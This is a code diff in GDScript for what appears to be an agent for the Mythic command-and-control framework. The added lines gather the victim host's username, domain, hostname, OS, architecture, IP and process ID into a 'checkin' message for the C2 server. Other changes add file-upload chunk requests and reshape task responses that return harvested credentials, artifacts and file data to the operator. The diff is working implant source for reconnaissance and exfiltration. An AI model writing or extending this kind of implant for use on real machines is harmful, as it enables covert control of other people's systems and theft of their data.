@@ -33,20 +33,71 @@ func get_uuid():
 
 func get_checkin_payload():
 	# https:#docs.mythic-c2.net/customizing/c2-related-development/c2-profile-code/agent-side-coding/initial-checkin
+	var username
+	if OS.has_environment("USERNAME"):
+		username = OS.get_environment("USERNAME")
+	else:
+		username = "UnknownUserName"
 
-	# TODO: gather value elements below and populate via. config
+	var userdomain
+	if OS.has_environment("USERDOMAIN"):
+		userdomain = OS.get_environment("USERDOMAIN")
+	else:
+		userdomain = ""
+
+	var hostname = OS.get_unique_id()
+	if OS.has_environment("COMPUTERNAME"):
+		hostname = OS.get_environment("COMPUTERNAME")
+	if OS.has_environment("HOSTNAME"):
+		hostname = OS.get_environment("HOSTNAME")
+
+	var os = "%s (%s)" % [OS.get_name(), OS.get_model_name()]
+	if OS.has_environment("OS"):
+		os = OS.get_environment("OS")
+	else:
+		if OS.has_feature("Windows"):
+			os = "Windows"
+		elif OS.has_feature("X11"):
+			os = "Linux"
+		elif OS.has_feature("OSX"):
+			os = "Mac"
+
+	var architecture = "Unknown"
+	if OS.has_feature("32"):
+		architecture = "32"
+	if OS.has_feature("64"):
+		architecture = "64"
+	if OS.has_feature("x86"):
+		architecture = "x86"
+	if OS.has_feature("x86_64"):
+		architecture = "x86_64"
+
+	var ip_adress :String
+
+	if OS.has_feature("Windows"):
+		if OS.has_environment("COMPUTERNAME"):
+			ip_adress =  IP.resolve_hostname(str(OS.get_environment("COMPUTERNAME")),1)
+	elif OS.has_feature("X11"):
+		print("X111")
+		if OS.has_environment("HOSTNAME"):
+			ip_adress =  IP.resolve_hostname(str(OS.get_environment("HOSTNAME")),1)
+			print("ip_adress: ", ip_adress)
+	elif OS.has_feature("OSX"):
+		if OS.has_environment("HOSTNAME"):
+			ip_adress =  IP.resolve_hostname(str(OS.get_environment("HOSTNAME")),1)
+
 	var payload = {
 		"action": "checkin", # required
-		"ip": "127.0.0.1", # internal ip address - required
-		"os": "Fedora 35", # os version - required
-		"user": "its-a-feature", # username of current user - required
-		"host": "spooky.local", # hostname of the computer - required
-		"pid": 4444, # pid of the current process - required
+		"ip": ip_adress, # internal ip address - required
+		"os": os, # os version - required
+		"user": username, # username of current user - required
+		"host": hostname, # hostname of the computer - required
+		"pid": OS.get_process_id(), # pid of the current process - required
 		"uuid": get_uuid(), #uuid of the payload - required
-		"architecture": "x64", # platform arch - optional
-		"domain": "test", # domain of the host - optional
-		"integrity_level": 3, # integrity level of the process - optional
-		"external_ip": "8.8.8.8", # external ip if known - optional
+		"architecture": architecture, # platform arch - optional
+		"domain": userdomain, # domain of the host - optional
+		#"integrity_level": 3, # integrity level of the process - optional
+		#"external_ip": "8.8.8.8", # external ip if known - optional
 		"encryption_key": "", # encryption key - optional
 		"decryption_key": "", # decryption key - optional
 	}
@@ -78,6 +129,19 @@ func create_file_response(task_id, filepath, host, is_screenshot, chunk_count, c
 	#return to_json(payload)
 	return payload
 
+func upload_file_chunk_request(task_id, filepath, chunk_size, file_id, chunk_num):
+	var payload = {
+		"upload": {
+			"chunk_size": chunk_size,
+			"file_id": file_id,
+			"chunk_num": chunk_num,
+			"full_path": filepath
+		},
+		"task_id": task_id
+	}
+
+	return payload
+
 func create_file_response_chunk(task_id, file_id, chunk_num, data):
 	var payload = {
 		"chunk_num": chunk_num, 
@@ -89,7 +153,7 @@ func create_file_response_chunk(task_id, file_id, chunk_num, data):
 	#return to_json(payload)
 	return payload
 
-func create_task_response(status, completed, task_id, output, artifacts = [], credentials = [], file_starts = [], file_chunks = []):
+func create_task_response(status, completed, task_id, output, artifacts = [], credentials = [], unkeyed_payloads = []):
 	var payload = {
 		"action": "post_response",
 		"responses": [],
@@ -115,11 +179,8 @@ func create_task_response(status, completed, task_id, output, artifacts = [], cr
 			entry["artifact"] = artifact[1]
 			task_response["artifacts"].append(entry)
 
-	for file_start in file_starts:
-		payload["responses"].append(file_start)
-	
-	for file_chunk in file_chunks:
-		payload["responses"].append(file_chunk)
+	for response in unkeyed_payloads:
+		payload["responses"].append(response)
 
 	if credentials.size() > 0 or artifacts.size() > 0: # damn mythic...it'd be nice if you used a key for files...or didn't for these...be consistent ffs!
 
@@ -141,8 +202,6 @@ func unwrap_payload(packet):
 	var data = Marshalls.base64_to_utf8(packet)
 	
 	print("unwrap payload was: ", data)
-
-	# 8e8354de-bfb4-47c8-8162-f11dbe68801d{"status":"success","decryption_key":"","encryption_key":"","id":"f7cccca6-ef2c-4113-a282-a327db0a769b","action":"checkin"}
 
 	ret["uuid"] = data.substr(0, 36)
 
